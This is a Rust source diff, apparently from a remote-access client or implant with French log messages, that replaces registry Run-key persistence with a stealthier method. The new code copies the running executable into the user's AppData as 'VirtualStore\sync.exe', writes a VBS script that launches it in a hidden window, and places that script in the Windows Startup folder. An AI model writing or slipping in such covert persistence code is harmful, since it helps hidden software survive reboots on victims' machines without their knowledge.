@@ -1,34 +1,86 @@
 use anyhow::Result;
 use std::env;
 use std::fs::{self, OpenOptions};
-use std::io::{BufRead, BufReader, Write};
-use std::path::PathBuf;
-
-//TODO Ajouter la copie du client dans un dossier caché
+use std::io::{BufRead, BufReader, Write, self};
+use std::path::{PathBuf, Path};
 
 #[cfg(target_os = "windows")]
-use winreg::enums::*;
-#[cfg(target_os = "windows")]
-use winreg::RegKey;
+fn get_executable_path() -> PathBuf {
+    let appdata = env::var("APPDATA").unwrap_or_else(|_| "C:\\Users\\Public".to_string());
+    PathBuf::from(format!("{}\\VirtualStore\\sync.exe", appdata))
+}
 
 #[cfg(target_os = "windows")]
-pub fn add_to_registry() -> std::io::Result<()> {
-    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
-    let path = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
-    let (key, _) = hkcu.create_subkey(path)?;
+fn get_vbs_path() -> PathBuf {
+    let appdata = env::var("APPDATA").unwrap_or_else(|_| "C:\\Users\\Public".to_string());
+    PathBuf::from(format!("{}\\helper.vbs", appdata))
+}
 
-    let exe_path = std::env::current_exe()?.to_string_lossy().to_string();
+#[cfg(target_os = "windows")]
+fn get_startup_folder() -> PathBuf {
+    let appdata = env::var("APPDATA").unwrap();
+    PathBuf::from(format!(
+        "{}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
+        appdata
+    ))
+}
 
-    let existing: Result<String, _> = key.get_value("Helper");
-    if let Ok(val) = existing {
-        if val == exe_path {
-            return Ok(());
-        }
-    }
+#[cfg(target_os = "windows")]
+fn write_vbs_launcher(vbs_path: &Path, exe_path: &Path) -> io::Result<()> {
+    let script = format!(
+        r#"Set WshShell = CreateObject("WScript.Shell")
+    WshShell.Run """" & "{}" & """", 0, False"#,
+        exe_path.to_string_lossy()
+    );
 
-    key.set_value("Helper", &exe_path)?;
+    fs::write(vbs_path, script)
+}
+
+#[cfg(target_os = "windows")]
+fn copy_to_startup(vbs_path: &Path) -> io::Result<()> {
+    let startup = get_startup_folder();
+    let dest = startup.join("helper.vbs");
+    fs::copy(vbs_path, dest)?;
     Ok(())
 }
+
+#[cfg(target_os = "windows")]
+fn copy_executable() -> io::Result<PathBuf> {
+    let target_path = get_executable_path();
+
+    if target_path.exists() {
+        return Ok(target_path);
+    }
+
+    let current_path = env::current_exe()?;
+    if let Some(parent) = target_path.parent() {
+        fs::create_dir_all(parent)?;
+    }
+
+    fs::copy(&current_path, &target_path)?;
+    Ok(target_path)
+}
+
+#[cfg(target_os = "windows")]
+pub fn setup_persistence_lolbin() {
+    match copy_executable() {
+        Ok(exe_path) => {
+            let vbs_path = get_vbs_path();
+            if let Err(e) = write_vbs_launcher(&vbs_path, &exe_path) {
+                eprintln!("Erreur création fichier VBS : {}", e);
+                return;
+            }
+
+            if let Err(e) = copy_to_startup(&vbs_path) {
+                eprintln!("Erreur copie dans Startup : {}", e);
+            } else {
+                println!("Persistance VBS installée via Startup.");
+            }
+        }
+        Err(e) => eprintln!("Erreur copie exécutable : {}", e),
+    }
+}
+
 
 pub fn add_to_autostart_gui() -> std::io::Result<()> {
     let autostart_dir = dirs::config_dir()
